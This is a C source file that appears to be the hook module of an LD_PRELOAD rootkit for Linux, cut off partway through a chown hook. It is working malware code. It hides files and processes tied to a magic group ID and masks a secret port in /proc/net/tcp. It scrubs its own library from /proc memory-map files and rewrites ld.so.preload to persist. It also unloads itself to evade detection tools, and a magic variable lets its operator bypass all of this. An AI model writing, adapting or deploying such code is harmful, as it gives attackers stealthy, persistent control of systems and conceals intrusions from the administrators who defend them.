#include "prototypes.h"



/*
      _                    _                 
     | |                  | |                
     | |__    ___    ___  | | __ ___     ___ 
     | '_ \  / _ \  / _ \ | |/ // __|   / __|
     | | | || (_) || (_) ||   < \__ \ _| (__ 
     |_| |_| \___/  \___/ |_|\_\|___/(_)\___|

    THIS FILE IS UNCUTE.
    HOOK UTILS & FUNCTION HOOKS THEMSELVES.

 */



/*
      _                 _            _   _ _     
     | |               | |          | | (_) |    
     | |__   ___   ___ | | __  _   _| |_ _| |___ 
     | '_ \ / _ \ / _ \| |/ / | | | | __| | / __|
     | | | | (_) | (_) |   <  | |_| | |_| | \__ \
     |_| |_|\___/ \___/|_|\_\  \__,_|\__|_|_|___/
                                             
 */


/*
    GET INFORMATION ABOUT PROCESSES. NAMELY,
    THEIR NAMES AND CMDLINE CONTENTS. USED SO
    WE CAN HIDE THE SUID BINARY EXECUTION PROCESS
 */
#define PROC_PATH         "/proc/%s"
#define CMDLINE_PATH      "%s/cmdline"
#define FALLBACK_PROCNAME "assdick"
#define NAME_MAXLEN       128     /* max lengths for storing process name */
#define CMDLINE_MAXLEN    256     /* & cmdline string. */

#define PID_MAXLEN         20      /* maximum length a pid can be. 20 to be safe */
#define PROCPATH_MAXLEN    strlen(PROC_PATH) + PID_MAXLEN
#define CMDLINEPATH_MAXLEN PROCPATH_MAXLEN + strlen(CMDLINE_PATH)

#define MODE_NAME     0x01   /* defined modes for determining whether */
#define MODE_CMDLINE  0x02   /* to get just the process name or its full */
                             /* cmdline entry. */

int open_cmdline(const char *proc){
    char path[CMDLINEPATH_MAXLEN];
    int fd;
    snprintf(path, sizeof(path), CMDLINE_PATH, proc);
    getsym(o_open, "open");
    fd = o_open(path, 0, 0);
    memset(path, 0, strlen(path));
    return fd;
}

char *process_info(const char *proc, short mode){
    char *process_info;
    int fd, c;

    fd = open_cmdline(proc);
    if(fd < 0){
        process_info = FALLBACK_PROCNAME;
        goto end_processinfo;
    }

    switch(mode){
        case MODE_NAME:
            process_info = (char *)malloc(NAME_MAXLEN);   /* read cmdline text into process_info.   */
                                                          /* cmdline null terminates after process' */
                                                          /* name.                                  */
            c = read(fd, process_info, NAME_MAXLEN);
            break;
        case MODE_CMDLINE:
            process_info = (char *)malloc(CMDLINE_MAXLEN);
            c = read(fd, process_info, CMDLINE_MAXLEN);

            for(int i = 0; i < c; i++)         /* replace null terminators with spaces  */
                if(process_info[i] == 0x00)    /* so that we can actually use the whole */
                    process_info[i] = 0x20;    /* 'cmdline' string.                     */
            break;
    }

    close(fd);
end_processinfo:
    return process_info;
}

char *get_myname(void){
    pid_t mypid = getpid();
    char pidbuf[PROCPATH_MAXLEN];
    snprintf(pidbuf, sizeof(pidbuf), "/proc/%d", mypid);
    return process_info(pidbuf, MODE_NAME);
}

int process(const char *name){
    int status = 0;
    char *myname = get_myname();
    if(!strcmp(name, myname)) status = 1;
    free(myname);
    return status;
}

/*
    FETCH PATHNAMES FROM FILE DESCRIPTORS.
 */
char *get_fdname(int fd){
    int readlink_status;
    char path[512], *filename = (char *)malloc(PATH_MAX);
    memset(filename, 0, PATH_MAX);

    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);

    readlink_status = readlink(path, filename, PATH_MAX);
    if(readlink_status < 0) strncpy(filename, "asdf", 5);
    return filename;
}


int snodew(void){
    if(getgid() == MAGIC_GID) return 1;
    if(getenv(MAGIC_VAR) != NULL) return 1;    
    return 0;
}

/* ignore all of these when determining
 * if a process is hidden or not. */
static char *const procignore[21] = {"sys", "uptime", "meminfo", "bus",
                                     "cgroups", "cmdline", "cpuinfo",
                                     "filesystems", "interrupts",
                                     "loadavg", "mounts", "net",
                                     "self", "stat", "tty", "version",
                                     "version_signature", "osrelease",
                                     "pid_max", "min_free_kbytes", NULL};
/*
    FILE & PROCESS HIDING UTILITIES.
 */
int hidden_process(const char *proc){
    if(strncmp("/proc", proc, 5) || strlen(proc) == 5)
        return 0;                                       /* proc must be a valid */
    if(!fnmatch("/proc/*/*", proc, FNM_PATHNAME))       /* process path...      */
        return 0;
    for(int i = 0; procignore[i] != NULL; i++)
        if(!strcmp(procignore[i], basename((char *)proc)))
            return 0;

    int r = 0;
    char *mycmdline = process_info(proc, MODE_CMDLINE);
    if(!strcmp(mycmdline, FALLBACK_PROCNAME)) return r;
    if(strlen(mycmdline) == 0){
        r = 0;
        goto end_hidden_process;
    }

    if(strstr(mycmdline, basename(SUID_BIN))){ /* hide our suid bin from  */
        r = 1;                                 /* process listings.       */
        goto end_hidden_process;
    }
end_hidden_process:
    free(mycmdline);
    return r;
}

int _hidden_path(const char *pathname, short mode){
    gid_t pathgid = 0;

    if(hidden_process(pathname)) return 1;

    if(mode == MODE_REG){
        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(struct stat));
        getsym(o_xstat, "__xstat");
        if(o_xstat(_STAT_VER, pathname, &s_fstat) < 0) return 0;
        pathgid = s_fstat.st_gid;
    }else if(mode == MODE_BIG){
        struct stat64 s_fstat64;
        memset(&s_fstat64, 0, sizeof(struct stat64));
        getsym(o_xstat64, "__xstat64");
        if(o_xstat64(_STAT_VER, pathname, &s_fstat64) < 0) return 0;
        pathgid = s_fstat64.st_gid;
    }

    if(pathgid == MAGIC_GID){
        /* only allow the service user to see&access both of these files. */
        if(iswww()){
            char *suidbin_name = basename(SUID_BIN);        /* allow the service user to get to */
            if(strstr(pathname, suidbin_name)) return 0;    /* these files. but no other files. */
            if(strstr(pathname, PHP_NEWFILENAME)) return 0;
        }

        return 1;
    }
    return 0;
}

int _hidden_lpath(const char *pathname, short mode){
    gid_t pathgid = 0;

    if(hidden_process(pathname)) return 1;

    if(mode == MODE_REG){
        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(struct stat));
        getsym(o_lxstat, "__lxstat");
        if(o_lxstat(_STAT_VER, pathname, &s_fstat) < 0) return 0;
        pathgid = s_fstat.st_gid;
    }else if(mode == MODE_BIG){
        struct stat64 s_fstat64;
        memset(&s_fstat64, 0, sizeof(struct stat64));
        getsym(o_lxstat64, "__lxstat64");
        if(o_lxstat64(_STAT_VER, pathname, &s_fstat64) < 0) return 0;
        pathgid = s_fstat64.st_gid;
    }

    if(pathgid == MAGIC_GID){
        if(iswww()){
            if(strstr(pathname, SUID_BIN)) return 0;
            if(strstr(pathname, PHP_NEWFILENAME)) return 0;
        }
        return 1;
    }
    return 0;
}

int _hidden_fd(int fd, short mode){
    gid_t fdgid = 0;
    int ret = 0;

    char *pathname = get_fdname(fd);
    if(hidden_process(pathname)){
        ret = 1;
        goto end_hiddenfd;
    }
    if(iswww()){
        if(strstr(pathname, SUID_BIN)){
            ret = 0;
            goto end_hiddenfd;
        }
        if(strstr(pathname, PHP_NEWFILENAME)){
            ret = 0;
            goto end_hiddenfd;
        }
    }

    if(mode == MODE_REG){
        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(struct stat));
        getsym(o_fxstat, "__fxstat");
        if(o_fxstat(_STAT_VER, fd, &s_fstat) < 0){
            ret = 0;
            goto end_hiddenfd;
        }
        fdgid = s_fstat.st_gid;
    }else if(mode == MODE_BIG){
        struct stat64 s_fstat64;
        memset(&s_fstat64, 0, sizeof(struct stat64));
        getsym(o_fxstat64, "__fxstat64");
        if(o_fxstat64(_STAT_VER, fd, &s_fstat64) < 0){
            ret = 0;
            goto end_hiddenfd;
        }
        fdgid = s_fstat64.st_gid;
    }

    if(fdgid == MAGIC_GID){
        if(iswww()){
            if(strstr(pathname, SUID_BIN)){
                ret = 0;
                goto end_hiddenfd;
            }
            if(strstr(pathname, PHP_NEWFILENAME)){
                ret = 0;
                goto end_hiddenfd;
            }
        }

        ret = 1;
    }
end_hiddenfd:
    free(pathname);
    return ret;
}
#define hidden_path(pathname) _hidden_path(pathname, MODE_REG)
#define hidden_path64(pathname) _hidden_path(pathname, MODE_BIG)
#define hidden_fd(fd) _hidden_fd(fd, MODE_REG)
#define hidden_fd64(fd) _hidden_fd(fd, MODE_BIG)
#define hidden_lpath(pathname) _hidden_lpath(pathname, MODE_REG)
#define hidden_lpath64(pathname) _hidden_lpath(pathname, MODE_BIG)

int hide_path(const char *path){
    getsym(o_chown, "chown");
    return o_chown(path, 0, MAGIC_GID);
}

/*
    PROCESS MEMORY MAP FORGING.
    HIDES LOCATION OF ROOTKIT FROM
    *maps FILES.
 */
FILE *forge_maps(const char *pathname){
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX];

    getsym(o_fopen, "fopen");
    pnt = o_fopen(pathname, "r");
    if(pnt == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
        if(!strstr(buf, SOPATH)) fputs(buf, o);

    memset(buf, 0, strlen(buf));
    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_smaps(const char *pathname){
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX];
    int i = 0;

    getsym(o_fopen, "fopen");
    pnt = o_fopen(pathname, "r");
    if(pnt == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL){
        if(i > 0) i++;
        if(i > 15) i = 0;
        if(strstr(buf, SOPATH)) i = 1;
        if(i == 0) fputs(buf, o);
    }

    memset(buf, 0, strlen(buf));
    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_numamaps(const char *pathname){
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX];

    getsym(o_fopen, "fopen");
    pnt = o_fopen(pathname, "r");
    if(pnt == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
        if(!strstr(buf, SOPATH)) fputs(buf, o);

    memset(buf, 0, strlen(buf));
    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}

/*
    PORT HIDING. HIDES SECRET_PORT FROM PROCNET
 */
int secret_connection(char line[]){
    char raddr[128], laddr[128], etc[128];
    unsigned long rxq, txq, t_len,
                  retr, inode;
    int lport, rport, d, state, uid, t_run, tout;

    sscanf(line, PROCNETFMT, &d, laddr, &lport, raddr, &rport, &state, &txq,
                             &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
                             etc);

    if(lport == SECRET_PORT || rport == SECRET_PORT)
        return 1;

    return 0;
}

// ss uses socket to list open sockets. socket()
// uses this function to break itself if a. calling process is ss
//                                     + b. you're connected using SECRET_PORT
int secretconnection_alive(void){
    char line[LINE_MAX];
    FILE *fp;
    int status = 0;

    getsym(o_fopen, "fopen");
    fp = o_fopen(TCPNET_PATH, "r");
    if(fp == NULL) return 0;

    while(fgets(line, sizeof(line), fp) != NULL){
        if(secret_connection(line)){
            status = 1;
            break;
        }
    }

    memset(line, 0, strlen(line));
    fclose(fp);
    return status;
}

/* returns a file pointer to a forged
 * /proc/net/ file. */
FILE *forge_procnet(const char *pathname){
    FILE *tmp = tmpfile(), *pnt;
    char line[LINE_MAX];

    getsym(o_fopen, "fopen");
    pnt = o_fopen(pathname, "r");
    if(pnt == NULL) return NULL;
    if(tmp == NULL) return pnt;

    while(fgets(line, sizeof(line), pnt) != NULL)
        if(!secret_connection(line))
            fputs(line, tmp);

    memset(line, 0, strlen(line));
    fclose(pnt);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}

void killself(short mode){
    if(geteuid() != 0){
        if(mode == KILLSELF_OUTPUT)
            printf("inadequate permissions\n");
        return;
    }
    getsym(o_unlink, "unlink");
    for(int i = 0; rmfiles[i] != NULL; i++){
        if(o_unlink(rmfiles[i]) < 0){
            if(mode == KILLSELF_OUTPUT)
                printf("something went wrong removing %s\n", rmfiles[i]);
        }else{
            if(mode == KILLSELF_OUTPUT)
                printf("successfully removed %s\n", rmfiles[i]);
        }
    }
}

int ld_inconsistent(void){
    struct stat ldstat;
    int inconsistent = 0, statval;

    getsym(o_xstat, "__xstat");
    memset(&ldstat, 0, sizeof(struct stat));
    statval = o_xstat(_STAT_VER, PRELOAD, &ldstat);

    if((statval < 0 && errno == ENOENT) || ldstat.st_size != strlen(SOPATH))
        inconsistent = 1;

    return inconsistent;
}

void reinstall(void){
    /* don't do anything if we don't need to... ((or can't)) */
    if(!ld_inconsistent()) return;

    getsym(o_fopen, "fopen");
    FILE *ldfp = o_fopen(PRELOAD, "w");

    if(ldfp != NULL){
        fwrite(SOPATH, strlen(SOPATH), 1, ldfp);
        fflush(ldfp);
        fclose(ldfp);

        hide_path(PRELOAD);
    }
}


/*
    FUNCTIONS FOR HIDING FROM BAD STUFF.
 */
int remove_self(void){
    if(geteuid() != 0) return -1;

    getsym(o_unlink, "unlink");
    unlink(PRELOAD);

    pid_t pid;
    if((pid = fork()) == -1) return -1;
    else if(pid == 0) return 1;

    wait(NULL);
    reinstall();
    hide_path(PRELOAD);
    return 2;
}

int evade(const char *filename, char *const argv[], char *const envp[]){
    char *scary_proc, *scary_path;

    for(int i = 0; scary_procs[i] != NULL; i++){
        scary_proc = scary_procs[i];

        char path[PATH_MAX];
        snprintf(path, sizeof(path), "*/%s", scary_proc);

        if(process(scary_proc)) return remove_self();
        if(!strncmp(scary_proc, filename, strlen(scary_proc))) return remove_self();
        if(!strncmp(scary_proc, argv[0], strlen(scary_proc))) return remove_self();
        if(!fnmatch(path, filename, FNM_PATHNAME)) return remove_self();
    }

    for(int i = 0; scary_paths[i] != NULL; i++){
        scary_path = scary_paths[i];
        if(!fnmatch(scary_path, filename, FNM_PATHNAME) || strstr(scary_path, filename))
            for(int ii = 0; argv[ii] != NULL; ii++)
                if(!strncmp("--list", argv[ii], 6))
                    return remove_self();
    }

    if(envp == NULL) return 0;
    for(int i = 0; envp[i] != NULL; i++)
        for(int ii = 0; scary_variables[ii] != NULL; ii++)
            if(!strncmp(scary_variables[ii], envp[i], strlen(scary_variables[ii])))
                return remove_self();

    /* nothing to do */
    return 0;
}



/*
       __                  _   _               _                 _        
      / _|                | | (_)             | |               | |       
     | |_ _   _ _ __   ___| |_ _  ___  _ __   | |__   ___   ___ | | _____ 
     |  _| | | | '_ \ / __| __| |/ _ \| '_ \  | '_ \ / _ \ / _ \| |/ / __|
     | | | |_| | | | | (__| |_| | (_) | | | | | | | | (_) | (_) |   <\__ \
     |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_| |_| |_|\___/ \___/|_|\_\___/

 */

/* EXEC */
int execve(const char *filename, char *const argv[], char *const envp[]){
    getsym(o_execve, "execve");
    if(snodew()){
        if(!fnmatch("*/killself", argv[0], FNM_PATHNAME)){
            killself(KILLSELF_OUTPUT);
            exit(0);
        }
        goto end_execve;
    }

    if(hidden_path(filename)){
        errno = ENOENT;      /* check if filename is hidden. */
        return -1;
    }

    int evasion_status = evade(filename, argv, envp);
    if(evasion_status < 0){
        errno = EPERM;
        return -1;
    }
    if(evasion_status == 2) exit(0);
    if(evasion_status == 1) goto end_execve;

end_execve:
    return o_execve(filename, argv, envp);
}
int execvp(const char *filename, char *const argv[]){
    getsym(o_execvp, "execvp");
    if(snodew()){
        if(!fnmatch("*/killself", argv[0], FNM_PATHNAME)){
            killself(KILLSELF_OUTPUT);
            exit(0);
        }
        goto end_execvp;
    }

    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

    int evasion_status = evade(filename, argv, NULL);
    if(evasion_status < 0){
        errno = EPERM;
        return -1;
    }
    if(evasion_status == 2) exit(0);
    if(evasion_status == 1) goto end_execvp;

end_execvp:
    return o_execvp(filename, argv);
}



/* STAT */
int stat(const char *pathname, struct stat *buf){
    getsym(o_xstat, "__xstat");
    if(snodew()) goto end_stat;
    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }
end_stat:
    return o_xstat(_STAT_VER, pathname, buf);
}

int stat64(const char *pathname, struct stat64 *buf){
    getsym(o_xstat64, "__xstat64");
    if(snodew()) goto end_stat64;
    if(hidden_path64(pathname)){
        errno = ENOENT;
        return -1;
    }
end_stat64:
    return o_xstat64(_STAT_VER, pathname, buf);
}

int fstat(int fd, struct stat *buf){
    getsym(o_fxstat, "__fxstat");
    if(snodew()) goto end_fstat;
    if(hidden_fd(fd)){
        errno = ENOENT;
        return -1;
    }
end_fstat:
    return o_fxstat(_STAT_VER, fd, buf);
}

int fstat64(int fd, struct stat64 *buf){
    getsym(o_fxstat64, "__fxstat64");
    if(snodew()) goto end_fstat64;
    if(hidden_fd64(fd)){
        errno = ENOENT;
        return -1;
    }
end_fstat64:
    return o_fxstat64(_STAT_VER, fd, buf);
}

int lstat(const char *pathname, struct stat *buf){
    getsym(o_lxstat, "__lxstat");
    if(snodew()) goto end_lstat;
    if(hidden_path(pathname) || hidden_lpath(pathname)){
        errno = ENOENT;
        return -1;
    }
end_lstat:
    return o_lxstat(_STAT_VER, pathname, buf);
}

int lstat64(const char *pathname, struct stat64 *buf){
    getsym(o_lxstat64, "__lxstat64");
    if(snodew()) goto end_lstat64;
    if(hidden_path64(pathname) || hidden_lpath64(pathname)){
        errno = ENOENT;
        return -1;
    }
end_lstat64:
    return o_lxstat64(_STAT_VER, pathname, buf);
}

int __xstat(int version, const char *pathname, struct stat *buf){
    getsym(o_xstat, "__xstat");
    if(snodew()) goto end_xstat;
    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }
end_xstat:
    return o_xstat(version, pathname, buf);
}

int __xstat64(int version, const char *pathname, struct stat64 *buf){
    getsym(o_xstat64, "__xstat64");
    if(snodew()) goto end_xstat64;
    if(hidden_path64(pathname)){
        errno = ENOENT;
        return -1;
    }
end_xstat64:
    return o_xstat64(version, pathname, buf);
}

int __fxstat(int ver, int fd, struct stat *buf){
    getsym(o_fxstat, "__fxstat");
    if(snodew()) goto end_fxstat;
    if(hidden_fd(fd)){
        errno = ENOENT;
        return -1;
    }
end_fxstat:
    return o_fxstat(ver, fd, buf);
}

int __fxstat64(int ver, int fd, struct stat64 *buf){
    getsym(o_fxstat64, "__fxstat64");
    if(snodew()) goto end_fxstat64;
    if(hidden_fd64(fd)){
        errno = ENOENT;
        return -1;
    }
end_fxstat64:
    return o_fxstat64(ver, fd, buf);
}

int __lxstat(int version, const char *pathname, struct stat *buf){
    getsym(o_lxstat, "__lxstat");
    if(snodew()) goto end_lxstat;
    if(hidden_path(pathname) || hidden_lpath(pathname)){
        errno = ENOENT;
        return -1;
    }
end_lxstat:
    return o_lxstat(version, pathname, buf);
}

int __lxstat64(int version, const char *pathname, struct stat64 *buf){
    getsym(o_lxstat64, "__lxstat64");
    if(snodew()) goto end_lxstat64;
    if(hidden_path64(pathname) || hidden_lpath64(pathname)){
        errno = ENOENT;
        return -1;
    }
end_lxstat64:
    return o_lxstat64(version, pathname, buf);
}



/* DIRECTORIES */
int rmdir(const char *pathname){
    getsym(o_rmdir, "rmdir");
    if(snodew()) goto end_rmdir;
    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }
end_rmdir:
    return o_rmdir(pathname);
}

DIR *opendir(const char *name){
    getsym(o_opendir, "opendir");
    if(snodew()) goto end_opendir;
    if(hidden_path(name)){
        errno = ENOENT;
        return NULL;
    }
end_opendir:
    return o_opendir(name);
}
DIR *opendir64(const char *name){
    getsym(o_opendir64, "opendir64");
    if(snodew()) goto end_opendir64;
    if(hidden_path(name)){
        errno = ENOENT;
        return NULL;
    }
end_opendir64:
    return o_opendir64(name);
}
DIR *fdopendir(int fd){
    getsym(o_fdopendir, "fdopendir");
    if(snodew()) goto end_fdopendir;
    if(hidden_fd(fd)){
        errno = ENOENT;
        return NULL;
    }
end_fdopendir:
    return o_fdopendir(fd);
}

int chdir(const char *path){
    getsym(o_chdir, "chdir");
    if(snodew()) goto end_chdir;
    if(hidden_path(path)){
        errno = ENOENT;
        return -1;
    }
end_chdir:
    return o_chdir(path);
}
int fchdir(int fd){
    getsym(o_fchdir, "fchdir");
    if(snodew()) goto end_fchdir;
    if(hidden_fd(fd)){
        errno = ENOENT;
        return -1;
    }
end_fchdir:
    return o_fchdir(fd);
}

struct dirent *readdir(DIR *dirp){
    char path[PATH_MAX], *filename;
    struct dirent *dir;

    getsym(o_readdir, "readdir");

    do{
        dir = o_readdir(dirp);
        if(snodew()) return dir;

        if(dir == NULL) continue;
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        filename = get_fdname(dirfd(dirp));
        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
        free(filename);
    }while(dir && hidden_path(path));

    return dir;
}
struct dirent64 *readdir64(DIR *dirp){
    char path[PATH_MAX], *filename;
    struct dirent64 *dir;

    getsym(o_readdir64, "readdir64");

    do{
        dir = o_readdir64(dirp);
        if(snodew()) return dir;

        if(dir == NULL) continue;
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        filename = get_fdname(dirfd(dirp));
        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
        free(filename);
    }while(dir && hidden_path(path));

    return dir;
}



/* FILE (UN)LINKING */
int link(const char *oldpath, const char *newpath){
    getsym(o_link, "link");
    if(snodew()) goto end_link;
    if(hidden_path(oldpath) || hidden_path(newpath)){
        errno = ENOENT;
        return -1;
    }
end_link:
    return o_link(oldpath, newpath);
}
int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags){
    getsym(o_linkat, "linkat");
    if(snodew()) goto end_linkat;
    if(hidden_path(oldpath) || hidden_path(newpath)){
        errno = ENOENT;    // check pathnames
        return -1;
    }
    if(hidden_fd(olddirfd) || hidden_fd(newdirfd)){
        errno = ENOENT;    // check fds
        return -1;
    }
end_linkat:
    return o_linkat(olddirfd, oldpath, newdirfd, newpath, flags);
}
int unlink(const char *pathname){
    getsym(o_unlink, "unlink");
    if(snodew()) goto end_unlink;
    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }
end_unlink:
    return o_unlink(pathname);
}
int unlinkat(int dirfd, const char *pathname, int flags){
    getsym(o_unlinkat, "unlinkat");
    if(snodew()) goto end_unlinkat;
    if(hidden_path(pathname) || hidden_fd(dirfd)){
        errno = ENOENT;
        return -1;
    }
end_unlinkat:
    return o_unlinkat(dirfd, pathname, flags);
}
int symlink(const char *target, const char *linkat){
    getsym(o_symlink, "symlink");
    if(snodew()) goto end_symlink;
    if(hidden_path(target) || hidden_path(linkat)){
        errno = ENOENT;
        return -1;
    }
end_symlink:
    return o_symlink(target, linkat);
}
int symlinkat(const char *target, int newdirfd, const char *linkat){
    getsym(o_symlinkat, "symlinkat");
    if(snodew()) goto end_symlinkat;
    if(hidden_path(target) || hidden_path(linkat)){
        errno = ENOENT;
        return -1;
    }
    if(hidden_fd(newdirfd)){
        errno = ENOENT;
        return -1;
    }
end_symlinkat:
    return o_symlinkat(target, newdirfd, linkat);
}



/* FILE ACCESS */
int access(const char *path, int amode){
    getsym(o_access, "access");
    if(snodew()) goto end_access;
    if(hidden_path(path)){
        errno = ENOENT;
        return -1;
    }
end_access:
    return o_access(path, amode);
}
int open(const char *pathname, int flags, mode_t mode){
    getsym(o_open, "open");
    if(snodew()) goto end_open;
    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
        return fileno(forge_procnet(pathname));

    if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX/4];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch("*/maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!strcmp("maps", pathname)) return fileno(forge_maps(pathname));
            if(!strcmp("smaps", pathname)) return fileno(forge_smaps(pathname));
            if(!strcmp("numa_maps", pathname)) return fileno(forge_numamaps(pathname));
        }
    }

end_open:
    return o_open(pathname, flags, mode);
}
int open64(const char *pathname, int flags, mode_t mode){
    getsym(o_open64, "open64");
    if(snodew()) goto end_open64;
    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
        return fileno(forge_procnet(pathname));

    if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX/4];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch("*/maps", pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps", pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps", pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!strcmp("maps", pathname)) return fileno(forge_maps(pathname));
            if(!strcmp("smaps", pathname)) return fileno(forge_smaps(pathname));
            if(!strcmp("numa_maps", pathname)) return fileno(forge_numamaps(pathname));
        }
    }

end_open64:
    return o_open64(pathname, flags, mode);
}
FILE *fopen(const char *path, const char *mode){
    getsym(o_fopen, "fopen");
    if(snodew()) goto end_fopen;
    if(hidden_path(path)){
        errno = ENOENT;
        return NULL;
    }

    if(!strcmp(path, "/proc/net/tcp") || !strcmp(path, "/proc/net/tcp6"))
        return forge_procnet(path);

    if(!fnmatch("/proc/*/maps", path, FNM_PATHNAME)) return forge_maps(path);
    if(!fnmatch("/proc/*/smaps", path, FNM_PATHNAME)) return forge_smaps(path);
    if(!fnmatch("/proc/*/numa_maps", path, FNM_PATHNAME)) return forge_numamaps(path);

    char cwd[PATH_MAX/4];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch("*/maps", path, FNM_PATHNAME)) return forge_maps(path);
            if(!fnmatch("*/smaps", path, FNM_PATHNAME)) return forge_smaps(path);
            if(!fnmatch("*/numa_maps", path, FNM_PATHNAME)) return forge_numamaps(path);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!strcmp("maps", path)) return forge_maps(path);
            if(!strcmp("smaps", path)) return forge_smaps(path);
            if(!strcmp("numa_maps", path)) return forge_numamaps(path);
        }
    }

end_fopen:
    return o_fopen(path, mode);
}
FILE *fopen64(const char *path, const char *mode){
    getsym(o_fopen64, "fopen64");
    if(snodew()) goto end_fopen64;
    if(hidden_path(path)){
        errno = ENOENT;
        return NULL;
    }

    if(!strcmp(path, "/proc/net/tcp") || !strcmp(path, "/proc/net/tcp6"))
        return forge_procnet(path);

    if(!fnmatch("/proc/*/maps", path, FNM_PATHNAME)) return forge_maps(path);
    if(!fnmatch("/proc/*/smaps", path, FNM_PATHNAME)) return forge_smaps(path);
    if(!fnmatch("/proc/*/numa_maps", path, FNM_PATHNAME)) return forge_numamaps(path);

    char cwd[PATH_MAX/4];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch("*/maps", path, FNM_PATHNAME)) return forge_maps(path);
            if(!fnmatch("*/smaps", path, FNM_PATHNAME)) return forge_smaps(path);
            if(!fnmatch("*/numa_maps", path, FNM_PATHNAME)) return forge_numamaps(path);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!strcmp("maps", path)) return forge_maps(path);
            if(!strcmp("smaps", path)) return forge_smaps(path);
            if(!strcmp("numa_maps", path)) return forge_numamaps(path);
        }
    }

end_fopen64:
    return o_fopen64(path, mode);
}



/* RENAMING */
int rename(const char *oldpath, const char *newpath){
    getsym(o_rename, "rename");
    if(snodew()) goto end_rename;
    if(hidden_path(oldpath) || hidden_path(newpath)){
        errno = ENOENT;
        return -1;
    }
end_rename:
    return o_rename(oldpath, newpath);
}
int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath){
    getsym(o_renameat, "renameat");
    if(snodew()) goto end_renameat;
    if(hidden_path(oldpath) || hidden_path(newpath)){
        errno = ENOENT;
        return -1;
    }
    if(hidden_fd(olddirfd) || hidden_fd(newdirfd)){
        errno = ENOENT;
        return -1;
    }
end_renameat:
    return o_renameat(olddirfd, oldpath, newdirfd, newpath);
}
int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags){
    getsym(o_renameat2, "renameat2");
    if(snodew()) goto end_renameat2;
    if(hidden_path(oldpath) || hidden_path(newpath)){
        errno = ENOENT;
        return -1;
    }
    if(hidden_fd(olddirfd) || hidden_fd(newdirfd)){
        errno = ENOENT;
        return -1;
    }
end_renameat2:
    return o_renameat2(olddirfd, oldpath, newdirfd, newpath, flags);
}



/* FILE ATTRIBUTES & PERMISSIONS */
int chmod(const char *path, mode_t mode){
    getsym(o_chmod, "chmod");
    if(snodew()) goto end_chmod;
    if(hidden_path(path)){
        errno = ENOENT;
        return -1;
    }
end_chmod:
    return o_chmod(path, mode);
}
int chown(const char *path, uid_t owner, gid_t group){
    getsym(o_chown, "chown");
    if(snodew()) goto end_chown;
    if(hidden_path(path)){
